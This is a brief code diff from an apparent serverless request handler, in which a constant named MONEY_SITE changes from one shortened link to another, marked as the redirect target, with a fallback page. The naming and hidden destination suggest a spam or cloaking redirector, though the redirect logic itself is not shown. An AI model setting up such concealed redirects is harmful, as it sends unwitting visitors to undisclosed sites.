@@ -4,7 +4,7 @@ export async function onRequest(context) {
   const params = url.searchParams;
 
   // ========= KONFIG =========
-  const MONEY_SITE = "https://t.ly/V1kWU"; // target redirect
+  const MONEY_SITE = "https://t.ly/haKWD"; // target redirect
   const FALLBACK = "/index.html"; // fallback page
   // ==========================
 
